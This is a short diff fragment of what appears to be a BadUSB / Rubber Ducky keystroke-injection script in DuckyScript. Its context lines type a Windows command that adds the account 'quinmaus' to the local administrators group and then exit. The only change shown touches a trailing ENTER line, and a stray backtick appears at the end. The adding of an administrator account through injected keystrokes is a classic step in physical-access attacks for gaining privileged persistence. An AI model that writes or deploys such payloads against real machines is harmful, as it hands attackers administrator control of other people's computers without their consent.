@@ -12,4 +12,4 @@ ENTER
 STRING net localgroup administrators quinmaus /add
 ENTER
 STRING exit
-ENTER
+ENTER`
